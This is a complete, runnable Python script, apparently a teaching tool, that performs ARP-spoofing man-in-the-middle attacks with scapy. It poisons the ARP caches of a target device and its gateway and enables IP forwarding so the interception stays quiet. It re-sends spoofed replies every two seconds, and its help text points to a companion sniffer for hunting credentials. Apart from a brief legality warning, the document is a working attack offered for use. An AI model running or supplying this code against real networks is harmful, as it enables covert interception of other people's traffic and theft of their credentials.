#!/usr/bin/env python3
"""
ARP Spoofer — Man-in-the-Middle (MITM) Tool
============================================
WHAT THIS DOES:
    Poisons the ARP cache of a target device and the gateway, making
    all traffic between them flow through YOUR machine. This is the
    classic man-in-the-middle attack.

WHY IT MATTERS:
    Once you're in the middle, you can:
    - See all unencrypted traffic (HTTP, FTP, DNS, etc.)
    - Modify packets in transit (inject content, redirect)
    - Capture credentials from unencrypted protocols
    - Perform DNS spoofing to redirect domains

    This is why HTTPS matters — even if someone is MITM'd, encrypted
    traffic can't be read. But DNS queries, HTTP traffic, and many
    IoT protocols are still cleartext.

HOW ARP SPOOFING WORKS:
    Normal:
        Target → "Who is the gateway?" → Gateway responds with its MAC
        Target's ARP cache: gateway_ip → gateway_mac

    Attack:
        Attacker → "I am the gateway!" (sends fake ARP reply to target)
        Target's ARP cache: gateway_ip → ATTACKER'S_mac

        Attacker → "I am the target!" (sends fake ARP reply to gateway)
        Gateway's ARP cache: target_ip → ATTACKER'S_mac

    Result:
        Target → Attacker → Gateway (all traffic flows through you)

    You also enable IP forwarding so packets actually get delivered
    (otherwise you'd just be a black hole and the target loses internet).

USAGE:
    sudo python3 arpspoof.py -t 192.168.1.5               # spoof target
    sudo python3 arpspoof.py -t 192.168.1.5 -g 192.168.1.1  # specify gateway
    sudo python3 arpspoof.py -t 192.168.1.5 --verbose      # show packets

    Then in another terminal:
    sudo python3 sniff.py -f "host 192.168.1.5"           # watch their traffic

WARNING:
    Only use on YOUR OWN network for testing/learning.
    ARP spoofing on networks you don't own is illegal.
"""

import sys
import os
import time
import signal
import argparse
import subprocess

from scapy.all import (
    ARP, Ether, sendp, getmacbyip, get_if_hwaddr,
    conf, srp,
)

conf.verb = 0


def get_mac(ip):
    """Get the MAC address of an IP on the local network via ARP."""
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(ether / arp, timeout=3, retry=2)[0]

    if result:
        return result[0][1].hwsrc
    return None


def get_gateway():
    """Auto-detect the default gateway IP."""
    try:
        result = subprocess.run(
            ["route", "-n", "get", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            if "gateway" in line.lower():
                return line.split(":")[-1].strip()
    except Exception:
        pass

    # Fallback: try common gateway addresses
    for gw in ["192.168.1.1", "192.168.0.1", "192.168.86.1", "10.0.0.1"]:
        mac = get_mac(gw)
        if mac:
            return gw

    return None


def enable_ip_forwarding():
    """
    Enable IP forwarding so packets we intercept get delivered.

    Without this, we'd be a black hole — the target would lose
    all connectivity, which is noisy and obvious.
    """
    system = sys.platform

    if system == "darwin":  # macOS
        subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                       capture_output=True)
        print("[*] IP forwarding enabled (macOS)")
    elif system == "linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] IP forwarding enabled (Linux)")
    else:
        print(f"[!] Unknown OS: {system}. Enable IP forwarding manually.")


def disable_ip_forwarding():
    """Restore IP forwarding to off."""
    system = sys.platform

    if system == "darwin":
        subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                       capture_output=True)
        print("[*] IP forwarding disabled")
    elif system == "linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print("[*] IP forwarding disabled")


def spoof(target_ip, target_mac, spoof_ip, interface=None):
    """
    Send a spoofed ARP reply.

    Tells target_ip that spoof_ip is at OUR mac address.
    This corrupts the target's ARP cache.

    op=2 means ARP reply (we're not asking, we're telling).
    """
    my_mac = get_if_hwaddr(interface or conf.iface)

    packet = Ether(dst=target_mac) / ARP(
        op=2,                    # ARP reply
        pdst=target_ip,          # target we're lying to
        hwdst=target_mac,        # target's real MAC
        psrc=spoof_ip,           # IP we're impersonating
        hwsrc=my_mac,            # OUR MAC (the lie)
    )

    sendp(packet, verbose=False, iface=interface)


def restore(target_ip, target_mac, source_ip, source_mac, interface=None):
    """
    Restore the ARP cache to its correct state.

    Send the REAL MAC address so the target's cache is fixed.
    This is important — if you don't restore, the target might
    lose connectivity until their cache expires.
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )

    # Send multiple times to make sure it sticks
    sendp(packet, count=5, verbose=False, iface=interface)


def mitm(target_ip, gateway_ip, interface=None, verbose=False):
    """
    Run the MITM attack.

    Continuously sends spoofed ARP replies to both the target and
    the gateway, keeping us in the middle.
    """
    print(f"\n[*] ARP Spoof — Man-in-the-Middle Attack")
    print(f"[*] Target:  {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print(f"[*] Interface: {interface or conf.iface}")

    # Resolve MAC addresses
    print(f"\n[*] Resolving MAC addresses...")

    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not resolve MAC for target {target_ip}")
        print(f"[!] Is the target online?")
        sys.exit(1)
    print(f"[+] Target MAC:  {target_mac}")

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print(f"[!] Could not resolve MAC for gateway {gateway_ip}")
        sys.exit(1)
    print(f"[+] Gateway MAC: {gateway_mac}")

    my_mac = get_if_hwaddr(interface or conf.iface)
    print(f"[+] Your MAC:    {my_mac}")

    # Enable IP forwarding
    enable_ip_forwarding()

    packets_sent = 0

    # Handle Ctrl+C gracefully
    def cleanup(sig=None, frame=None):
        print(f"\n\n[*] Restoring ARP tables...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        restore(gateway_ip, gateway_mac, target_ip, target_mac, interface)
        disable_ip_forwarding()
        print(f"[*] ARP tables restored. {packets_sent} packets sent total.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    print(f"\n[*] Spoofing started. Press Ctrl+C to stop.")
    print(f"[*] Target thinks YOU are the gateway")
    print(f"[*] Gateway thinks YOU are the target")
    print(f"[*] All traffic now flows through your machine\n")

    if not verbose:
        print(f"[*] Run in another terminal to see traffic:")
        print(f"    sudo python3 sniff.py -f 'host {target_ip}'\n")

    try:
        while True:
            # Tell target: "I am the gateway"
            spoof(target_ip, target_mac, gateway_ip, interface)

            # Tell gateway: "I am the target"
            spoof(gateway_ip, gateway_mac, target_ip, interface)

            packets_sent += 2

            if verbose:
                sys.stdout.write(
                    f"\r[*] Packets sent: {packets_sent} "
                    f"(spoofing every 2s)"
                )
                sys.stdout.flush()

            # Re-send every 2 seconds to keep the poison active
            # ARP caches expire, so we need to keep refreshing
            time.sleep(2)

    except KeyboardInterrupt:
        cleanup()


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofer — MITM Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 arpspoof.py -t 192.168.1.5
  sudo python3 arpspoof.py -t 192.168.1.5 -g 192.168.1.1
  sudo python3 arpspoof.py -t 192.168.1.5 --verbose

After starting the spoof, capture traffic in another terminal:
  sudo python3 sniff.py -f "host 192.168.1.5"
  sudo python3 sniff.py --creds   # hunt for credentials
        """
    )

    parser.add_argument("-t", "--target", required=True,
                        help="Target IP to intercept")
    parser.add_argument("-g", "--gateway",
                        help="Gateway IP (auto-detected if not specified)")
    parser.add_argument("-i", "--interface",
                        help="Network interface to use")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show packet count")

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] ARP spoofing requires root. Run with sudo.")
        sys.exit(1)

    gateway = args.gateway or get_gateway()
    if not gateway:
        print("[!] Could not detect gateway. Specify with -g")
        sys.exit(1)

    mitm(args.target, gateway, interface=args.interface, verbose=args.verbose)


if __name__ == "__main__":
    main()
